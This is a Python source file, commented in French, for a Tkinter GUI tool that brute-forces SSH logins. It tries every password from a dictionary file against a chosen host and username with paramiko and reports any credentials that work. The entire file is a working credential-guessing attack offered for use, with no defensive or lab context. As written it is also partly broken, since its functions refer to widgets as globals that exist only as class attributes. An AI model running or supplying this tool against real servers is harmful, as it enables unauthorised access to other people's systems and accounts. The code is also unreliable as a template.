import paramiko
import time
import threading
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import scrolledtext, messagebox
from pathlib import Path
import socket

# Initialiser colorama
init(autoreset=True)

# Verrou pour éviter les chevauchements dans les impressions
print_lock = threading.Lock()
# Variables partagées pour indiquer l'état de l'attaque
password_found = threading.Event()
stop_attack = threading.Event()
attack_thread = None

def try_password(host, username, password, delay=1):
    if password_found.is_set() or stop_attack.is_set():
        return None
    time.sleep(delay)  # Ajouter un délai entre les tentatives
    if password_found.is_set() or stop_attack.is_set():  # Vérifier après le délai
        return None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password, timeout=5)
        if password_found.is_set() or stop_attack.is_set():  # Vérifier après connexion
            ssh.close()
            return None
        with print_lock:
            log_message(f"Succès ! Nom d'utilisateur : {username}, Mot de passe : {password}", "green")
        password_found.set()
        ssh.close()
        return (username, password)
    except paramiko.AuthenticationException:
        with print_lock:
            log_message(f"Échec pour le mot de passe : {password}", "red")
    except Exception as e:
        with print_lock:
            log_message(f"Erreur : {e}", "yellow")
    return None

def brute_force_ssh(host, username, password_file, max_workers=5, delay=1):
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_password, host, username, password, delay) for password in passwords]

        for future in as_completed(futures):
            result = future.result()
            if result:
                # Annuler les futures restantes
                for fut in futures:
                    fut.cancel()
                return result
            if stop_attack.is_set():
                break

    if not stop_attack.is_set():
        with print_lock:
            log_message("Aucune combinaison nom d'utilisateur/mot de passe n'a fonctionné.", "red")
    return None

def log_message(message, color):
    output_text.config(state=tk.NORMAL)
    output_text.insert(tk.END, message + "\n", color)
    output_text.config(state=tk.DISABLED)
    output_text.see(tk.END)

def start_brute_force():
    global attack_thread

    host = host_entry.get()
    username = username_entry.get()
    password_file = password_file_entry.get()

    if not host or not username or not password_file:
        messagebox.showerror("Erreur", "Veuillez remplir tous les champs.")
        return

    # Nettoyer la boîte de dialogue
    output_text.config(state=tk.NORMAL)
    output_text.delete(1.0, tk.END)
    output_text.config(state=tk.DISABLED)

    port = 22

    stop_attack.clear()
    password_found.clear()

    # Désactiver le bouton "Démarrer l'attaque" et activer le bouton "Arrêter l'attaque"
    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

    attack_thread = threading.Thread(target=check_server_and_start_attack, args=(host, port, username, password_file))
    attack_thread.start()

def check_server_and_start_attack(host, port, username, password_file):
    log_message("Vérification de la disponibilité du serveur SSH...", "blue")
    if not check_server_availability(host, port):
        log_message(f"Le serveur SSH n'est pas disponible ou le port {port} n'est pas ouvert.", "red")
        stop_brute_force()  # Arrêter si le serveur n'est pas disponible
        return

    log_message("Démarrage de l'attaque de bruteforce sur SSH...", "blue")

    result = brute_force_ssh(host, username, password_file)

    if result:
        username, password = result
        log_message(f"Mot de passe trouvé ! Nom d'utilisateur : {username}, Mot de passe : {password}", "green")
    else:
        if not stop_attack.is_set():
            log_message("Aucun mot de passe valide trouvé.", "red")
        else:
            log_message("Attaque arrêtée par l'utilisateur.", "red")
    
    # Signaler la fin de l'attaque
    root.after(0, finalize_attack)

def stop_brute_force():
    stop_attack.set()
    if attack_thread is not None:
        attack_thread.join()
    # Réactiver le bouton "Démarrer l'attaque" et désactiver le bouton "Arrêter l'attaque"
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

def finalize_attack():
    # Réactiver le bouton "Démarrer l'attaque" et désactiver le bouton "Arrêter l'attaque"
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

def check_server_availability(host, port):
    try:
        with socket.create_connection((host, port), timeout=10):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

class SSHBruteforceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Programme de Bruteforce SSH")

        # Ajouter l'icône
        icon_path = "F:/Documents/07_projet_python/programmes_ok/logos/bruteforce_ssh.ico"
        self.root.iconbitmap(icon_path)

        # Configuration de la fenêtre principale
        self.root.geometry("600x500")

        # Chemin par défaut pour le fichier de mots de passe
        self.default_password_file = str(Path(__file__).parent / "dictionnaire_mots_de_passe.txt")

        # Ajout des éléments de l'interface
        tk.Label(self.root, text="Adresse du serveur SSH:").pack(pady=5)
        self.host_entry = tk.Entry(self.root, width=50)
        self.host_entry.pack(pady=5)

        tk.Label(self.root, text="Nom d'utilisateur:").pack(pady=5)
        self.username_entry = tk.Entry(self.root, width=50)
        self.username_entry.pack(pady=5)

        tk.Label(self.root, text="Fichier de mots de passe:").pack(pady=5)
        self.password_file_entry = tk.Entry(self.root, width=50)
        self.password_file_entry.insert(0, self.default_password_file)
        self.password_file_entry.pack(pady=5)

        self.start_button = tk.Button(self.root, text="Démarrer l'attaque", command=start_brute_force)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(self.root, text="Arrêter l'attaque", command=stop_brute_force, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        self.output_text = scrolledtext.ScrolledText(self.root, width=80, height=10, state=tk.DISABLED)
        self.output_text.pack(pady=10)

        # Ajout de styles pour les messages de log
        self.output_text.tag_config("red", foreground="red")
        self.output_text.tag_config("green", foreground="green")
        self.output_text.tag_config("yellow", foreground="orange")
        self.output_text.tag_config("blue", foreground="blue")

if __name__ == "__main__":
    root = tk.Tk()
    app = SSHBruteforceApp(root)
    root.mainloop()
